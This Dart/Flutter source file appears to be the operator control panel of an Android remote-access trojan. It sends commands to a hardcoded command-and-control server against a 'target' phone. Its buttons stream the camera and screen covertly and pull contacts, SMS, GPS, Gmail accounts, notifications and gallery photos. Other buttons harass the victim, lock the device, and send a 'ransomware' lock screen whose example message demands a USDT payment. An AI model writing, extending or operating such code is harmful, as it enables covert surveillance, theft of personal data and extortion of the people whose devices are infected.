import 'dart:async';
import 'dart:ui' as ui;
import 'dart:convert';
import 'dart:typed_data';
import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'package:url_launcher/url_launcher.dart';

class ControlCenterPage extends StatefulWidget {
  final Map<String, dynamic>? targetDevice;
  final String role;
  const ControlCenterPage({super.key, this.targetDevice, this.role = 'owner'});
  @override State<ControlCenterPage> createState() => _ControlCenterPageState();
}

class _ControlCenterPageState extends State<ControlCenterPage> with SingleTickerProviderStateMixin {

  static const String _kBase = 'http://draoffice.danzxnhosting.my.id:11860';
  
  static const Color _kText = Color(0xFFF5F5F5);
  static const Color _kTextSecondary = Color(0xFFB0B0B0);
  static const Color _kBorder = Color(0xFF2A2A2A);
  
  static const Color _kLiveColor = Color(0xFFFF3366);
  static const Color _kCameraColor = Color(0xFF00E5FF);
  static const Color _kIntelColor = Color(0xFF9D4EDD);
  static const Color _kAudioColor = Color(0xFFFFB74D);
  static const Color _kLockColor = Color(0xFF4CAF50);
  static const Color _kWarning = Color(0xFFFFB74D);
  static const Color _kSuccess = Color(0xFF00E676);
  static const Color _kError = Color(0xFFFF5252);
  static const Color _kInfo = Color(0xFF448AFF);
  static const Color _kPurple = Color(0xFFCE93D8);
  static const Color _kTeal = Color(0xFF80CBC4);

  late TabController _tabs;
  final List<String> _log = [];
  final List<Map<String, dynamic>> _menuItems = [];

  bool _liveOn = false;
  Uint8List? _frame;
  Timer? _liveTimer;
  String _liveTitle = '';
  int _fps = 0, _frmCount = 0;
  DateTime _fpsTs = DateTime.now();
  final _frameN = ValueNotifier<int>(0);

  final List<Map<String, String>> _chat = [];
  final _chatCtrl = TextEditingController();
  final _chatScroll = ScrollController();
  Timer? _chatTimer;

  String get _id => widget.targetDevice?['id']?.toString() ?? 'unknown';
  String get _model => widget.targetDevice?['model']?.toString() ?? 'Device';
  String get _battery => widget.targetDevice?['battery']?.toString() ?? '--';

  @override
  void initState() {
    super.initState();
    _tabs = TabController(length: 6, vsync: this);
    _initMenuItems();
    _chatTimer = Timer.periodic(const Duration(seconds: 3), (_) => _pollChat());
  }

  void _initMenuItems() {
    _menuItems.addAll([
      // Tab 0: Live
      {'tab': 0, 'title': 'Live Camera', 'icon': Icons.videocam_rounded, 'color': _kLiveColor, 'action': () => _showCamPicker((side) { _startLive('live_camera_start', side); _showLiveDialog(); })},
      {'tab': 0, 'title': 'Live Screen', 'icon': Icons.desktop_windows_rounded, 'color': _kCameraColor, 'action': () { _startLive('live_screen_start', ''); _showLiveDialog(); }},
      {'tab': 0, 'title': 'Stop Live', 'icon': Icons.stop_rounded, 'color': _kWarning, 'action': _stopLive},
      
      // Tab 1: Camera
      {'tab': 1, 'title': 'Take Photo', 'icon': Icons.camera_alt_rounded, 'color': _kCameraColor, 'action': () => _showCamPicker((s) => _cmd('take_photo', extra: s))},
      {'tab': 1, 'title': 'Screenshot', 'icon': Icons.screenshot_monitor, 'color': _kInfo, 'action': () => _cmd('get_screen')},
      {'tab': 1, 'title': 'Set Wallpaper', 'icon': Icons.wallpaper_rounded, 'color': _kPurple, 'action': () => _inputDialog('Set Wallpaper', 'Image URL', (v) => _cmd('set_wallpaper', extra: v))},
      {'tab': 1, 'title': 'Strobe ON', 'icon': Icons.flash_on_rounded, 'color': _kWarning, 'action': () => _cmd('flash_strobe')},
      {'tab': 1, 'title': 'Strobe OFF', 'icon': Icons.flash_off_rounded, 'color': _kTextSecondary, 'action': () => _cmd('stop_strobe')},
      
      // Tab 2: Intel
      {'tab': 2, 'title': 'Contacts', 'icon': Icons.contacts_rounded, 'color': _kIntelColor, 'action': () => _cmd('get_contacts')},
      {'tab': 2, 'title': 'GPS Location', 'icon': Icons.my_location_rounded, 'color': _kSuccess, 'action': () => _cmd('get_location')},
      {'tab': 2, 'title': 'Gmail & Accounts', 'icon': Icons.account_circle_rounded, 'color': _kError, 'action': () => _cmd('get_gmails')},
      {'tab': 2, 'title': 'SMS Inbox', 'icon': Icons.sms_rounded, 'color': _kInfo, 'action': () => _cmd('get_sms')},
      {'tab': 2, 'title': 'Notifications', 'icon': Icons.notifications_rounded, 'color': _kPurple, 'action': () => _fetchNotif()},
      {'tab': 2, 'title': 'Gallery (5 Photos)', 'icon': Icons.photo_library_rounded, 'color': _kTeal, 'action': () => _cmd('get_gallery', extra: '5')},
      
      // Tab 3: Audio
      {'tab': 3, 'title': 'Play Audio', 'icon': Icons.play_circle_rounded, 'color': _kAudioColor, 'action': () => _inputDialog('Play Audio', 'MP3 URL', (v) => _cmd('play_audio', extra: v))},
      {'tab': 3, 'title': 'Stop Audio', 'icon': Icons.stop_circle_rounded, 'color': _kTextSecondary, 'action': () => _cmd('stop_audio')},
      {'tab': 3, 'title': 'Vibrate Loop', 'icon': Icons.vibration_rounded, 'color': _kPurple, 'action': () => _cmd('vibrate_loop')},
      {'tab': 3, 'title': 'Open URL', 'icon': Icons.open_in_browser, 'color': _kInfo, 'action': () => _inputDialog('Open URL', 'https://...', (v) => _cmd('open_url', extra: v))},
      {'tab': 3, 'title': 'Kill WiFi', 'icon': Icons.wifi_off_rounded, 'color': _kWarning, 'action': () => _cmd('kill_wifi')},
      
      // Tab 4: Lock (DENGAN TOMBOL RANSOMWARE & SCARE VIDEO)
      {'tab': 4, 'title': 'Lock Live + Chat', 'icon': Icons.lock_rounded, 'color': _kLockColor, 'action': () => _lockLiveDialog()},
      {'tab': 4, 'title': 'Lock with HTML', 'icon': Icons.code_rounded, 'color': _kPurple, 'action': () => _showHtmlLockDialog()},
      {'tab': 4, 'title': 'Lock Device', 'icon': Icons.lock_outline_rounded, 'color': _kWarning, 'action': () => _inputDialog('Lock Device', 'Message', (msg) { _inputDialog('PIN', '4 digit PIN', (pin) { _cmd('hard_lock', extra: '$msg|$pin'); }, isNumber: true); })},
      {'tab': 4, 'title': 'Unlock Device', 'icon': Icons.lock_open_rounded, 'color': _kSuccess, 'action': () => _cmd('unlock')},
      // 🔥 TOMBOL RANSOMWARE
      {'tab': 4, 'title': '💀 SEND RANSOMWARE', 'icon': Icons.warning_rounded, 'color': _kError, 'action': () => _sendRansomware()},
      // 🎬 TOMBOL SCARE VIDEO
      {'tab': 4, 'title': '🎬 SEND SCARE VIDEO', 'icon': Icons.movie_rounded, 'color': _kError, 'action': () => _sendScareVideo()},
      
      // Tab 5: Device
      {'tab': 5, 'title': 'Restart Device', 'icon': Icons.restart_alt_rounded, 'color': _kWarning, 'action': () => _showRestartDialog()},
      {'tab': 5, 'title': 'Wake Up', 'icon': Icons.wb_sunny_rounded, 'color': _kSuccess, 'action': () => _cmd('force_open')},
    ]);
  }

  // 💀 METHOD SEND RANSOMWARE KE TARGET
  void _sendRansomware() {
    _inputDialog(
      '💀 RANSOMWARE LOCK', 
      'Pesan ancaman (contoh: DEVICE LOCKED! Bayar 500k USDT)', 
      (pesan) {
        _inputDialog(
          'SET PIN UNLOCK', 
          '4 digit PIN untuk unlock (contoh: 1234)', 
          (pin) {
            _inputDialog(
              'NAMA PENGUNCI', 
              'Nama yang akan tampil di lock screen', 
              (owner) {
                // Kirim command ke target
                _cmd('ransomware_lock', extra: '$pesan|$pin|$owner');
                _addLog('💀 RANSOMWARE terkirim ke target!');
                
                // Show success dialog
                showDialog(
                  context: context,
                  builder: (_) => AlertDialog(
                    backgroundColor: Colors.black,
                    title: const Text('💀 RANSOMWARE ACTIVATED', style: TextStyle(color: Colors.red, fontWeight: FontWeight.bold)),
                    content: Column(
                      mainAxisSize: MainAxisSize.min,
                      children: [
                        const Icon(Icons.warning, color: Colors.red, size: 60),
                        const SizedBox(height: 10),
                        Text('Target: $_model', style: const TextStyle(color: Colors.white)),
                        const SizedBox(height: 10),
                        Text('PIN UNLOCK: $pin', style: const TextStyle(color: Colors.green, fontSize: 20, fontWeight: FontWeight.bold)),
                        const SizedBox(height: 10),
                        const Text('Device sekarang TERKUNCI TOTAL!', style: TextStyle(color: Colors.red)),
                      ],
                    ),
                    actions: [
                      TextButton(
                        onPressed: () => Navigator.pop(context),
                        child: const Text('OK', style: TextStyle(color: Colors.red)),
                      ),
                    ],
                  ),
                );
              }
            );
          },
          isNumber: true,
        );
      }
    );
  }

  // 🎬 METHOD SEND SCARE VIDEO KE TARGET
  void _sendScareVideo() {
    _inputDialog(
      '🎬 SCARE VIDEO', 
      'URL MP4 (Catbox):\nKosongkan untuk pakai default', 
      (url) {
        String videoUrl = url.isNotEmpty ? url : 'https://files.catbox.moe/2cpiro.mp4';
        _cmd('play_scare_video', extra: videoUrl);
        _addLog('🎬 Scare video terkirim: $videoUrl');
        
        ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(
            content: Row(children: [
              const Icon(Icons.video_library, color: Colors.white),
              const SizedBox(width: 10),
              Text('🎬 Video scare dikirim ke $_model'),
            ]),
            backgroundColor: Colors.red,
            duration: const Duration(seconds: 3),
          ),
        );
      }
    );
  }

  Future<void> _cmd(String cmd, {String extra = '', bool silent = false}) async {
    if (_id == 'unknown') return;
    try {
      final res = await http.post(
        Uri.parse('$_kBase/api/send-command'),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({'id': _id, 'command': cmd, 'extra': extra}),
      ).timeout(const Duration(seconds: 12));
      if (res.statusCode == 200 && !silent) {
        _addLog('Sent: $cmd');
      }
    } catch (e) {
      if (!silent) _addLog('Error: $e');
    }
  }

  void _addLog(String m) {
    if (!mounted) return;
    setState(() {
      _log.insert(0, '[${DateTime.now().toString().substring(11,19)}] $m');
      if (_log.length > 50) _log.removeLast();
    });
  }

  void _showRestartDialog() {
    showDialog(context: context, builder: (_) => AlertDialog(
      backgroundColor: const Color(0xFF1A1A1A),
      title: const Text('Restart Device', style: TextStyle(color: Colors.white)),
      content: const Text('Device will restart', style: TextStyle(color: Colors.grey)),
      actions: [
        TextButton(onPressed: () => Navigator.pop(context), child: const Text('Cancel', style: TextStyle(color: Colors.grey))),
        ElevatedButton(onPressed: () { Navigator.pop(context); _cmd('reboot_device'); }, child: const Text('Restart')),
      ],
    ));
  }

  Future<void> _startLive(String mode, String extra) async {
    await _cmd(mode, extra: extra);
    if (!mounted) return;
    setState(() {
      _liveOn = true;
      _frame = null;
      _liveTitle = mode == 'live_camera_start' ? (extra == 'front' ? 'FRONT CAM' : 'BACK CAM') : 'SCREEN';
      _frmCount = 0;
      _fps = 0;
      _fpsTs = DateTime.now();
    });
    _liveTimer?.cancel();
    _liveTimer = Timer.periodic(const Duration(milliseconds: 100), (_) async {
      if (!_liveOn || !mounted) return;
      try {
        final res = await http.get(Uri.parse('$_kBase/api/live-frame/$_id')).timeout(const Duration(milliseconds: 500));
        if (res.statusCode == 200 && res.body.isNotEmpty) {
          final data = jsonDecode(res.body);
          final raw = data['frame']?.toString() ?? '';
          if (raw.isNotEmpty) {
            final clean = raw.contains(',') ? raw.split(',').last : raw;
            final bytes = base64Decode(clean);
            setState(() {
              _frame = bytes;
              _frmCount++;
              final ms = DateTime.now().difference(_fpsTs).inMilliseconds;
              if (ms >= 1000) {
                _fps = (_frmCount * 1000 / ms).round();
                _frmCount = 0;
                _fpsTs = DateTime.now();
              }
            });
            _frameN.value++;
          }
        }
      } catch (_) {}
    });
  }

  void _stopLive() {
    _liveTimer?.cancel();
    setState(() => _liveOn = false);
    _cmd('live_stop', silent: true);
  }

  void _showLiveDialog() {
    showDialog(
      context: context,
      builder: (_) => Dialog(
        backgroundColor: Colors.transparent,
        child: Container(
          decoration: BoxDecoration(
            borderRadius: BorderRadius.circular(20),
            color: Colors.black.withOpacity(0.9),
          ),
          child: Column(mainAxisSize: MainAxisSize.min, children: [
            Padding(
              padding: const EdgeInsets.all(12),
              child: Row(children: [
                const Icon(Icons.circle, color: Colors.red, size: 10),
                const SizedBox(width: 8),
                Text('LIVE - $_liveTitle', style: const TextStyle(color: Colors.white)),
                const Spacer(),
                Text('$_fps fps', style: const TextStyle(color: Colors.green)),
              ]),
            ),
            _frame != null
                ? Image.memory(_frame!, height: 300, fit: BoxFit.contain)
                : const SizedBox(height: 200, child: Center(child: CircularProgressIndicator())),
            Padding(
              padding: const EdgeInsets.all(12),
              child: ElevatedButton(
                style: ElevatedButton.styleFrom(backgroundColor: Colors.red),
                onPressed: () { _stopLive(); Navigator.pop(context); },
                child: const Text('STOP', style: TextStyle(color: Colors.white)),
              ),
            ),
          ]),
        ),
      ),
    );
  }

  void _lockLiveDialog() {
    final msgCtrl = TextEditingController();
    final pinCtrl = TextEditingController();
    showDialog(context: context, builder: (_) => AlertDialog(
      backgroundColor: const Color(0xFF1A1A1A),
      title: const Text('Lock Live + Chat', style: TextStyle(color: Colors.white)),
      content: Column(mainAxisSize: MainAxisSize.min, children: [
        TextField(controller: msgCtrl, style: const TextStyle(color: Colors.white), decoration: const InputDecoration(hintText: 'Message', hintStyle: TextStyle(color: Colors.grey))),
        const SizedBox(height: 10),
        TextField(controller: pinCtrl, style: const TextStyle(color: Colors.white), keyboardType: TextInputType.number, decoration: const InputDecoration(hintText: 'PIN', hintStyle: TextStyle(color: Colors.grey))),
      ]),
      actions: [
        TextButton(onPressed: () => Navigator.pop(context), child: const Text('Cancel', style: TextStyle(color: Colors.grey))),
        ElevatedButton(onPressed: () {
          Navigator.pop(context);
          _cmd('lock_live', extra: '${msgCtrl.text}|${pinCtrl.text}');
        }, child: const Text('LOCK')),
      ],
    ));
  }

  void _showCamPicker(Function(String) onPick) {
    String sel = 'back';
    showDialog(context: context, builder: (_) => StatefulBuilder(
      builder: (ctx, setState) => AlertDialog(
        backgroundColor: const Color(0xFF1A1A1A),
        title: const Text('Select Camera', style: TextStyle(color: Colors.white)),
        content: Row(mainAxisAlignment: MainAxisAlignment.spaceEvenly, children: [
          _buildCamOption('back', 'Back', sel == 'back', () => setState(() => sel = 'back')),
          _buildCamOption('front', 'Front', sel == 'front', () => setState(() => sel = 'front')),
        ]),
        actions: [
          TextButton(onPressed: () => Navigator.pop(ctx), child: const Text('Cancel', style: TextStyle(color: Colors.grey))),
          ElevatedButton(onPressed: () { Navigator.pop(ctx); onPick(sel); }, child: const Text('Select')),
        ],
      ),
    ));
  }

  Widget _buildCamOption(String value, String label, bool isSelected, VoidCallback onTap) {
    return GestureDetector(
      onTap: onTap,
      child: Container(
        padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 10),
        decoration: BoxDecoration(
          color: isSelected ? Colors.blue.withOpacity(0.3) : Colors.transparent,
          borderRadius: BorderRadius.circular(8),
          border: Border.all(color: isSelected ? Colors.blue : Colors.grey),
        ),
        child: Column(children: [
          Icon(value == 'back' ? Icons.camera_rear : Icons.camera_front, color: isSelected ? Colors.blue : Colors.grey),
          const SizedBox(height: 5),
          Text(label, style: TextStyle(color: isSelected ? Colors.blue : Colors.grey)),
        ]),
      ),
    );
  }

  void _inputDialog(String title, String hint, Function(String) onDone, {bool isNumber = false}) {
    final ctrl = TextEditingController();
    showDialog(context: context, builder: (_) => AlertDialog(
      backgroundColor: const Color(0xFF1A1A1A),
      title: Text(title, style: const TextStyle(color: Colors.white)),
      content: TextField(
        controller: ctrl,
        keyboardType: isNumber ? TextInputType.number : TextInputType.text,
        style: const TextStyle(color: Colors.white),
        decoration: InputDecoration(hintText: hint, hintStyle: const TextStyle(color: Colors.grey)),
      ),
      actions: [
        TextButton(onPressed: () => Navigator.pop(context), child: const Text('Cancel', style: TextStyle(color: Colors.grey))),
        ElevatedButton(onPressed: () { Navigator.pop(context); onDone(ctrl.text); }, child: const Text('Send')),
      ],
    ));
  }

  void _showHtmlLockDialog() {
    final pinCtrl = TextEditingController();
    final htmlCtrl = TextEditingController();
    htmlCtrl.text = '<h1>DEVICE LOCKED</h1><input type="password" id="pin" placeholder="PIN"><button onclick="unlock()">UNLOCK</button><script>function unlock(){var pin=document.getElementById("pin").value;if(pin)location.href="unlock://"+pin;}</script>';
    
    showDialog(context: context, builder: (_) => AlertDialog(
      backgroundColor: const Color(0xFF1A1A1A),
      title: const Text('HTML Lock', style: TextStyle(color: Colors.white)),
      content: SizedBox(
        width: 300,
        child: Column(mainAxisSize: MainAxisSize.min, children: [
          TextField(controller: pinCtrl, style: const TextStyle(color: Colors.white), keyboardType: TextInputType.number, decoration: const InputDecoration(hintText: 'PIN', hintStyle: TextStyle(color: Colors.grey))),
          const SizedBox(height: 10),
          Container(height: 200, child: TextField(controller: htmlCtrl, maxLines: null, expands: true, style: const TextStyle(color: Colors.white), decoration: const InputDecoration(hintText: 'HTML Code', hintStyle: TextStyle(color: Colors.grey)))),
        ]),
      ),
      actions: [
        TextButton(onPressed: () => Navigator.pop(context), child: const Text('Cancel', style: TextStyle(color: Colors.grey))),
        ElevatedButton(onPressed: () {
          Navigator.pop(context);
          String encoded = base64.encode(utf8.encode(htmlCtrl.text));
          _cmd('lock_with_html', extra: '$encoded|${pinCtrl.text}');
        }, child: const Text('SEND')),
      ],
    ));
  }

  void _fetchNotif() async {
    _addLog('Fetching notifications...');
    try {
      final res = await http.get(Uri.parse('$_kBase/api/get-notifications/$_id'));
      if (res.statusCode == 200) {
        final list = jsonDecode(res.body) as List;
        _addLog('${list.length} notifications');
      }
    } catch (_) {}
  }

  void _pollChat() async {
    if (_id == 'unknown') return;
    try {
      final res = await http.get(Uri.parse('$_kBase/api/lock-chat-all/$_id')).timeout(const Duration(seconds: 4));
      if (res.statusCode == 200 && mounted) {
        final msgs = (jsonDecode(res.body)['messages'] as List? ?? []);
        if (msgs.length != _chat.length) {
          setState(() {
            _chat.clear();
            for (final m in msgs) {
              _chat.add({'from': m['from']?.toString() ?? '', 'text': m['text']?.toString() ?? '', 'time': m['time']?.toString() ?? ''});
            }
          });
        }
      }
    } catch (_) {}
  }

  void _sendChat(String text) {
    if (text.trim().isEmpty) return;
    _chatCtrl.clear();
    setState(() => _chat.add({'from': 'owner', 'text': text.trim(), 'time': TimeOfDay.now().format(context)}));
    http.post(Uri.parse('$_kBase/api/lock-chat/$_id'), body: jsonEncode({'text': text.trim(), 'from': 'owner'}), headers: {'Content-Type': 'application/json'});
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.black,
      appBar: AppBar(
        backgroundColor: Colors.black,
        elevation: 0,
        leading: IconButton(
          icon: const Icon(Icons.arrow_back, color: Colors.white),
          onPressed: () => Navigator.pop(context),
        ),
        title: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Text(_model, style: const TextStyle(color: Colors.white, fontSize: 16, fontWeight: FontWeight.bold)),
            Text('Battery: $_battery%', style: const TextStyle(color: Colors.grey, fontSize: 11)),
          ],
        ),
        bottom: PreferredSize(
          preferredSize: const Size.fromHeight(45),
          child: Container(
            margin: const EdgeInsets.symmetric(horizontal: 12),
            child: TabBar(
              controller: _tabs,
              isScrollable: true,
              indicator: BoxDecoration(
                color: Colors.white.withOpacity(0.2),
                borderRadius: BorderRadius.circular(20),
              ),
              labelColor: Colors.white,
              unselectedLabelColor: Colors.grey,
              tabs: const [
                Tab(text: 'Live'), Tab(text: 'Camera'), Tab(text: 'Intel'),
                Tab(text: 'Audio'), Tab(text: 'Lock'), Tab(text: 'Device'),
              ],
            ),
          ),
        ),
      ),
      body: Column(
        children: [
          Container(
            height: 45,
            margin: const EdgeInsets.all(8),
            padding: const EdgeInsets.symmetric(horizontal: 10),
            decoration: BoxDecoration(
              color: Colors.white.withOpacity(0.05),
              borderRadius: BorderRadius.circular(8),
            ),
            child: _log.isEmpty
                ? const Center(child: Text('No activity', style: TextStyle(color: Colors.grey, fontSize: 11)))
                : ListView.builder(
                    scrollDirection: Axis.horizontal,
                    itemCount: _log.length,
                    itemBuilder: (_, i) => Padding(
                      padding: const EdgeInsets.only(right: 12),
                      child: Text(_log[i], style: const TextStyle(color: Colors.grey, fontSize: 10)),
                    ),
                  ),
          ),
          Expanded(
            child: TabBarView(
              controller: _tabs,
              children: [
                _buildGrid(0), _buildGrid(1), _buildGrid(2),
                _buildGrid(3), _buildChatLockTab(), _buildGrid(5),
              ],
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildGrid(int tabIndex) {
    final items = _menuItems.where((item) => item['tab'] == tabIndex).toList();
    
    return Padding(
      padding: const EdgeInsets.all(12),
      child: GridView.builder(
        gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(
          crossAxisCount: 2,
          crossAxisSpacing: 12,
          mainAxisSpacing: 12,
          childAspectRatio: 0.9,
        ),
        itemCount: items.length,
        itemBuilder: (context, index) {
          final item = items[index];
          return _buildCard(
            title: item['title'],
            icon: item['icon'],
            color: item['color'],
            onTap: item['action'],
          );
        },
      ),
    );
  }

  Widget _buildCard({
    required String title,
    required IconData icon,
    required Color color,
    required VoidCallback onTap,
  }) {
    return GestureDetector(
      onTap: onTap,
      child: Container(
        decoration: BoxDecoration(
          borderRadius: BorderRadius.circular(20),
          gradient: LinearGradient(
            begin: Alignment.topLeft,
            end: Alignment.bottomRight,
            colors: [
              color.withOpacity(0.15),
              Colors.white.withOpacity(0.05),
            ],
          ),
          border: Border.all(
            color: color.withOpacity(0.4),
            width: 1,
          ),
          boxShadow: [
            BoxShadow(
              color: color.withOpacity(0.2),
              blurRadius: 8,
              offset: const Offset(0, 3),
            ),
          ],
        ),
        child: ClipRRect(
          borderRadius: BorderRadius.circular(20),
          child: BackdropFilter(
            filter: ui.ImageFilter.blur(sigmaX: 5, sigmaY: 5),
            child: Container(
              padding: const EdgeInsets.all(12),
              child: Column(
                mainAxisAlignment: MainAxisAlignment.center,
                children: [
                  Container(
                    padding: const EdgeInsets.all(14),
                    decoration: BoxDecoration(
                      color: color.withOpacity(0.2),
                      shape: BoxShape.circle,
                    ),
                    child: Icon(icon, color: color, size: 36),
                  ),
                  const SizedBox(height: 12),
                  Text(
                    title,
                    style: TextStyle(
                      color: Colors.white,
                      fontSize: 13,
                      fontWeight: FontWeight.w600,
                    ),
                    textAlign: TextAlign.center,
                    maxLines: 2,
                    overflow: TextOverflow.ellipsis,
                  ),
                ],
              ),
            ),
          ),
        ),
      ),
    );
  }

  Widget _buildChatLockTab() {
    final lockItems = _menuItems.where((item) => item['tab'] == 4 && item['title'] != 'Lock Live + Chat').toList();
    
    return SingleChildScrollView(
      padding: const EdgeInsets.all(12),
      child: Column(
        children: [
          GestureDetector(
            onTap: () => _lockLiveDialog(),
            child: Container(
              width: double.infinity,
              padding: const EdgeInsets.all(16),
              decoration: BoxDecoration(
                borderRadius: BorderRadius.circular(20),
                gradient: LinearGradient(
                  colors: [_kLockColor.withOpacity(0.2), Colors.white.withOpacity(0.05)],
                ),
                border: Border.all(color: _kLockColor.withOpacity(0.5)),
              ),
              child: Row(
                children: [
                  Container(
                    padding: const EdgeInsets.all(10),
                    decoration: BoxDecoration(
                      color: _kLockColor.withOpacity(0.2),
                      shape: BoxShape.circle,
                    ),
                    child: const Icon(Icons.lock_rounded, color: _kLockColor, size: 28),
                  ),
                  const SizedBox(width: 16),
                  const Expanded(
                    child: Text('Lock Live + Chat', style: TextStyle(color: Colors.white, fontSize: 16, fontWeight: FontWeight.bold)),
                  ),
                  const Icon(Icons.arrow_forward, color: _kLockColor),
                ],
              ),
            ),
          ),
          const SizedBox(height: 16),
          GridView.builder(
            shrinkWrap: true,
            physics: const NeverScrollableScrollPhysics(),
            gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(
              crossAxisCount: 2,
              crossAxisSpacing: 12,
              mainAxisSpacing: 12,
              childAspectRatio: 0.9,
            ),
            itemCount: lockItems.length,
            itemBuilder: (context, index) {
              final item = lockItems[index];
              return _buildCard(
                title: item['title'],
                icon: item['icon'],
                color: item['color'],
                onTap: item['action'],
              );
            },
          ),
          const SizedBox(height: 16),
          Container(
            decoration: BoxDecoration(
              borderRadius: BorderRadius.circular(16),
              color: Colors.white.withOpacity(0.05),
            ),
            child: Column(
              children: [
                const Padding(
                  padding: EdgeInsets.all(12),
                  child: Text('CHAT WITH TARGET', style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold)),
                ),
                Container(
                  height: 200,
                  child: _chat.isEmpty
                      ? const Center(child: Text('No messages', style: TextStyle(color: Colors.grey)))
                      : ListView.builder(
                          controller: _chatScroll,
                          padding: const EdgeInsets.all(8),
                          itemCount: _chat.length,
                          itemBuilder: (_, i) {
                            final m = _chat[i];
                            return Align(
                              alignment: m['from'] == 'owner' ? Alignment.centerRight : Alignment.centerLeft,
                              child: Container(
                                margin: const EdgeInsets.symmetric(vertical: 4),
                                padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 8),
                                decoration: BoxDecoration(
                                  color: m['from'] == 'owner' ? _kLockColor.withOpacity(0.7) : Colors.white.withOpacity(0.1),
                                  borderRadius: BorderRadius.circular(12),
                                ),
                                child: Text(m['text'] ?? '', style: const TextStyle(color: Colors.white)),
                              ),
                            );
                          },
                        ),
                ),
                Padding(
                  padding: const EdgeInsets.all(8),
                  child: Row(
                    children: [
                      Expanded(
                        child: TextField(
                          controller: _chatCtrl,
                          style: const TextStyle(color: Colors.white),
                          decoration: const InputDecoration(
                            hintText: 'Type message...',
                            hintStyle: TextStyle(color: Colors.grey),
                            border: OutlineInputBorder(),
                          ),
                          onSubmitted: _sendChat,
                        ),
                      ),
                      const SizedBox(width: 8),
                      IconButton(
                        icon: const Icon(Icons.send, color: _kLockColor),
                        onPressed: () => _sendChat(_chatCtrl.text),
                      ),
                    ],
                  ),
                ),
              ],
            ),
          ),
        ],
      ),
    );
  }

  @override
  void dispose() {
    _tabs.dispose();
    _chatCtrl.dispose();
    _chatScroll.dispose();
    _liveTimer?.cancel();
    _chatTimer?.cancel();
    _frameN.dispose();
    super.dispose();
  }
}